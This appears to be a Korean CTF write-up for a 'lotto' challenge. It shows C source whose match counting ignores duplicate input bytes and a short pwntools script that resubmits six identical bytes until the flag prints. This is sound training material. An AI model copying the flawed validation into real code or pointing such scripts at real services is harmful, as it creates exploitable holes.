---
sort: 13
---

# lotto

home 디렉토리에 lotto.c파일에 소스코드가 들어있다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

unsigned char submit[6];

void play(){

        int i;
        printf("Submit your 6 lotto bytes : ");
        fflush(stdout);

        int r;
        r = read(0, submit, 6);

        printf("Lotto Start!\n");
        //sleep(1);

        // generate lotto numbers
        int fd = open("/dev/urandom", O_RDONLY);
        if(fd==-1){
                printf("error. tell admin\n");
                exit(-1);
        }
        unsigned char lotto[6];
        if(read(fd, lotto, 6) != 6){
                printf("error2. tell admin\n");
                exit(-1);
        }
        for(i=0; i<6; i++){
                lotto[i] = (lotto[i] % 45) + 1;         // 1 ~ 45
        }
        close(fd);

        // calculate lotto score
        int match = 0, j = 0;
        for(i=0; i<6; i++){
                for(j=0; j<6; j++){
                        if(lotto[i] == submit[j]){
                                match++;
                        }
                }
        }

        // win!
        if(match == 6){
                system("/bin/cat flag");
        }
        else{
                printf("bad luck...\n");
        }

}

void help(){
        printf("- nLotto Rule -\n");
        printf("nlotto is consisted with 6 random natural numbers less than 46\n");
        printf("your goal is to match lotto numbers as many as you can\n");
        printf("if you win lottery for *1st place*, you will get reward\n");
        printf("for more details, follow the link below\n");
        printf("http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n");
        printf("mathematical chance to win this game is known to be 1/8145060.\n");
}

int main(int argc, char* argv[]){

        // menu
        unsigned int menu;

        while(1){

                printf("- Select Menu -\n");
                printf("1. Play Lotto\n");
                printf("2. Help\n");
                printf("3. Exit\n");

                scanf("%d", &menu);

                switch(menu){
                        case 1:
                                play();
                                break;
                        case 2:
                                help();
                                break;
                        case 3:
                                printf("bye\n");
                                return 0;
                        default:
                                printf("invalid menu\n");
                                break;
                }
        }
        return 0;
}
```

1 ~ 45인 값 6개를 넣어서 모두 맞추면 되는 로또다.<br>
근데 사용자의 input을 답과 비교하는 과정에서 input에 중복이 들어가는 경우를 걸러내지 않았다.<br>
따라서 랜덤값 6개중에 하나만 맞추면 되기 때문에 확률이 확 늘어난다.<br><br>
아래는 2로 찍는 코드다.

```python
from pwn import *

p = process("/home/lotto/lotto")

while True:
    """
    - Select Menu -
    1. Play Lotto
    2. Help
    3. Exit
    """
    p.recvline()
    p.recvline()
    p.recvline()
    p.recvline()

    p.sendline("1")

    # Submit your 6 lotto bytes :
    p.recvuntil(" : ")

    p.send("\x02\x02\x02\x02\x02\x02\n")

    # Lotto Start!
    p.recvline()

    result = p.recvline()
    if "bad luck..." not in result:
        print(result)
        break
```

```bash
lotto@pwnable:~$ python /tmp/dlfjs1234/lotto.py
```

```tip
## 알게 된 점

logic bug
```